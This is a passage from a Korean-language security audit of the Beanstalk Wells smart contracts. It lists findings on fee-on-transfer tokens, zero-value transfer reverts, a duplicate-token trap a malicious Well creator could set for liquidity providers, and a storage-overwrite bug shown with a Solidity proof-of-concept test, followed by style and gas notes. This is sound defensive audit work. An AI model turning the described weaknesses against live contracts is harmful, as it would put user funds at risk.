    emit RemoveLiquidity(lpAmountIn, tokenAmountsOut);
}
```


# 중 (Medium)

## [M-01] 전송 수수료가 있는(fee-on-transfer) ERC20 토큰에 대한 지원 부족

### 설명

Well은 현재 준비금 잔액을 조회하기 위해 ERC20의 `balanceOf()` 함수에 의존하지 않습니다.
이는 좋은 설계 선택입니다.
프로토콜에 저장된 준비금 값은 실제 잔액보다 작거나 같아야 합니다.

현재 구현은 `safeTransfer()`가 항상 지정된 양만큼 실제 잔액을 증가시킬 것이라고 가정합니다.

그러나 일부 [ERC20 토큰] (https://github.com/d-xo/weird-erc20 )은 전송 시 수수료를 부과하며 실제 잔액 증가분은 지정된 양보다 적을 수 있습니다. ([Well.sol #L422](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L422))
이는 프로토콜의 불변성을 깨뜨립니다.

### 파급력

이 취약점은 토큰에 의존적이므로 중요도를 **중(MEDIUM)**으로 평가합니다.

### 권장 완화 조치

- 프로토콜이 이러한 종류의 토큰을 지원할 의도가 없다면, safeTransfer 호출 후 실제 잔액 증가를 확인하여 이를 방지하세요.
- 프로토콜이 모든 종류의 ERC20 토큰을 지원하고자 한다면, 호출자가 전송 금액을 결정하고 나중에 잔액 증가량을 확인할 수 있도록 훅 메소드를 사용하세요.

## [M-02] 일부 토큰은 0 수량 전송 시 되돌리기(revert) 발생

### 설명

Well 프로토콜은 다양한 ERC20 토큰과 함께 사용하도록 의도되었습니다.
일부 ERC20 토큰은 0 수량을 전송할 때 되돌리기(revert)하며, 수량이 양수일 때만 전송하는 것이 권장됩니다.([참조](https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers))
여러 곳에서 현재 구현은 전송 금액을 확인하지 않고 `safeTransferFrom()` 함수를 호출합니다.
([removeLiquidity](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L313), [removeLiquidityImbalanced](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L422))

### 파급력

일부 ERC20 토큰의 경우, 프로토콜의 중요한 함수(예: `removeLiquidity`)가 되돌려질(revert) 수 있으며 이는 지급 불능으로 이어질 수 있습니다.
중요도를 **중(MEDIUM)**으로 평가합니다.

### 권장 완화 조치

전송 함수를 호출하기 전에 전송 금액이 양수인지 확인하세요.

## [M-03] ImmutableTokens에 대해 토큰이 고유한지 확인해야 함

### 설명

현재 구현은 `ImmutableTokens`의 `_tokens`에서 고유성을 강제하지 않습니다.

`_tokens[0]=_tokens[1]`이라고 가정합니다.
정직한 유동성 제공자가 `addLiquidity([1 ether,1 ether], 200 ether, address)`를 호출하여 준비금이 `(1 ether, 1 ether)`가 됩니다.
이 시점에서 누구나 `skim()` 함수를 호출하여 1 ether를 가져갈 수 있습니다.

악의적인 Well 생성자는 이를 악용하여 함정을 만들고 정직한 유동성 제공자로부터 이익을 취할 수 있습니다.

### 파급력

일반적인 유동성 제공자가 자금을 보내기 전에 토큰을 확인할 만큼 똑똑하다고 가정하면 가능성은 낮으므로, 중요도를 **중(MEDIUM)**으로 평가합니다.

### 권장 완화 조치

`ImmutableTokens`에서 `_tokens` 배열의 고유성을 강제하세요.
이는 `ImmutableTokens::getTokenFromList()` 함수에서도 수행할 수 있습니다.

# 하 (Low)

## [L-01] LibBytes의 잘못된 sload

### 설명

`LibBytes`의 `storeUint128` 함수는 주어진 슬롯에서 시작하여 uint128 `reserves`를 패킹하려고 하지만, [홀수 개의 준비금을 저장할 때](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibBytes.sol#L78) 실제로는 마지막 슬롯을 덮어씁니다. 현재는 `Well::_updatePumps`의 결과를 입력으로 받아 항상 `_tokens.length`를 인수로 취하는 [`Well::_setReserves`](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L514)에서만 호출됩니다. 따라서 토큰 수가 홀수인 경우 오류에 관계없이 슬롯의 마지막 128비트는 액세스되지 않습니다. 그러나 라이브러리가 다른 구현에서 사용되어 항상 전체 토큰 길이에 대해 작동하는 것이 아니라 한 번에 가변적인 수의 준비금을 설정하는 경우, 의도치 않게 마지막 준비금을 0으로 덮어쓸 수 있습니다.

### 개념 증명 (Proof of Concept)

다음 테스트 케이스는 이 문제를 더 명확하게 보여줍니다.

```solidity
// NOTE: Add to LibBytes.t.sol
function test_exploitStoreAndRead() public {
    // Write to storage slot to demonstrate overwriting existing values
    // In this case, 420 will be stored in the lower 128 bits of the last slot
    bytes32 slot = RESERVES_STORAGE_SLOT;
    uint256 maxI = (NUM_RESERVES_MAX - 1) / 2;
    uint256 storeValue = 420;
    assembly {
        sstore(add(slot, mul(maxI, 32)), storeValue)
    }

    // Read reserves and assert the final reserve is 420
    uint[] memory reservesBefore = LibBytes.readUint128(RESERVES_STORAGE_SLOT, NUM_RESERVES_MAX);
    emit log_named_array("reservesBefore", reservesBefore);

    // Set up reserves to store, but only up to NUM_RESERVES_MAX - 1 as we have already stored a value in the last 128 bits of the last slot
    uint[] memory reserves = new uint[](NUM_RESERVES_MAX - 1);
    for (uint i = 1; i < NUM_RESERVES_MAX; i++) {
        reserves[i-1] = i;
    }

    // Log the last reserve before the store, perhaps from other implementations which don't always act on the entire reserves length
    uint256 t;
    assembly {
        t := shr(128, shl(128, sload(add(slot, mul(maxI, 32)))))
    }
    emit log_named_uint("final slot, lower 128 bits before", t);

    // Store reserves
    LibBytes.storeUint128(RESERVES_STORAGE_SLOT, reserves);

    // Re-read reserves and compare
    uint[] memory reserves2 = LibBytes.readUint128(RESERVES_STORAGE_SLOT, NUM_RESERVES_MAX);

    emit log_named_array("reserves", reserves);
    emit log_named_array("reserves2", reserves2);

    // But wait, what about the last reserve
    assembly {
        t := shr(128, shl(128, sload(add(slot, mul(maxI, 32)))))
    }

    // Turns out it was overwritten by the last store as it calculates the sload incorrectly
    emit log_named_uint("final slot, lower 128 bits after", t);
}
```

![완화 조치 전 출력](Screenshot_2023-02-13_at_17.06.46.jpg)

### 파급력

자산이 직접적으로 위험에 처하지 않으므로 중요도를 **하(LOW)**로 평가합니다.

### 권장 완화 조치

스토리지에서 기존 값을 로드하고 하위 비트에 패킹하도록 다음 수정 사항을 구현하세요.

```solidity
	sload(add(slot, mul(maxI, 32)))
```

![완화 조치 후 출력](Screenshot_2023-02-13_at_17.07.07.jpg)

# QA

## [NC-01] 비표준 스토리지 패킹

[Solidity 문서](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html)에 따르면, 패킹된 스토리지 슬롯의 첫 번째 항목은 하위 순서(lower-order)로 정렬되어 저장됩니다. 그러나 `LibBytes`의 [수동 패킹](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibBytes.sol#L32)은 이 규칙을 따르지 않습니다. 첫 번째 패킹된 값을 하위 순서 정렬 위치에 저장하도록 `storeUint128` 함수를 수정하세요.

## [NC-02] EIP-1967 두 번째 사전 이미지 모범 사례
[Well.sol::RESERVES_STORAGE_SLOT](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L37)에서와 같이 사용자 지정 [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967) 스토리지 슬롯을 계산할 때, 두 번째 사전 이미지(second pre-image) 공격 가능성을 줄이기 위해 해시된 값에 `-1`의 [오프셋을 추가하는 것](https://ethereum-magicians.org/t/eip-1967-standard-proxy-storage-slots/3185?u=frangio)이 모범 사례입니다.

## [NC-03] 실험적인 ABIEncoderV2 pragma 제거
ABIEncoderV2는 Solidity 0.8에서 기본적으로 활성화되어 있으므로 [두](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/interfaces/IWellFunction.sol#L6) [인스턴스](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/interfaces/IPump.sol#L6)를 제거할 수 있습니다.

## [NC-04] 인라인 어셈블리에서 10진수/16진수 표기법의 일관성 없는 사용
가독성을 높이고 인라인 어셈블리 작업 시 오류를 방지하기 위해 정수 상수에는 10진수 표기법을, 메모리 오프셋에는 16진수 표기법을 사용해야 합니다.

## [NC-05] 사용되지 않는 변수, import 및 오류
`LibBytes`에서 `storeUint128`의 [`temp` 변수]((https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibBytes.sol#L39))는 사용되지 않으므로 제거해야 합니다.

`LibMath`에서:
- OpenZeppelin SafeMath가 import 되었지만 사용되지 않음
- `PRBMath_MulDiv_Overflow` 오류가 선언되었지만 사용되지 않음

## [NC-06] LibMath 주석의 불일치
`LibMath`의 `nthRoot` 및 `sqrt` [함수](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibMath.sol#L44-L147) 내의 코드에서는 `a`를 사용하고 주석에서는 `x`를 사용하는 불일치가 있습니다.

## [NC-07] FIXME 및 TODO 주석
해결해야 할 여러 [FIXME](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/interfaces/IWell.sol#L268) 및 [TODO](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibMath.sol#L36) 주석이 있습니다.

## [NC-08] 올바른 NatSpec 태그 사용
`@dev See {IWell.fn}` 사용은 인터페이스에서 NatSpec 문서를 상속하기 위해 `@inheritdoc IWell`로 대체되어야 합니다.

## [NC-09] 가독성을 위한 포맷팅
가독성을 위해 코드는 연산자 양쪽에 단일 공백을 포함하는 [Solidity 스타일 가이드](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#other-recommendations)에 따라 포맷팅되어야 합니다: 예: [`numberOfBytes0 - 1`](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/utils/ImmutablePumps.sol#L220).

## [NC-10] 철자 오류
다음과 같은 철자 오류가 확인되었습니다:
- ['configurating'](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/interfaces/IWell.sol#L110)은 'configuration'이 되어야 합니다.
- ['Pump'/'_pumo'](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/Well.sol#L43)는 'Pumps'/'_pumps'가 되어야 합니다.

## [G-1] 모듈로 연산 단순화
`LibBytes::storeUint128` 및 `LibBytes::readUint128`에서 `reserves.lenth % 2 == 1` 및 `i % 2 == 1`은 `reserves.length & 1 == 1` 및 `i & 1 == 1`로 단순화할 수 있습니다.

## [G-2] 분기 없는(Branchless) 최적화
`MathLib`의 `sqrt` 함수 및 [관련 주석](https://github.com/BeanstalkFarms/Wells/blob/7c498215f843620cb24ec5bbf978c6495f6e5fe4/src/libraries/LibMath.sol#L136-L145)은 [분기 없는 최적화](https://github.com/transmissions11/solmate/blob/1b3adf677e7e383cc684b5d5bd441da86bf4bf1c/src/utils/FixedPointMathLib.sol#L220-L225) `z := sub(z, lt(div(x, z), z))`를 포함하는 Solmate의 `FixedPointMathLib` 변경 사항을 반영하도록 업데이트되어야 합니다.
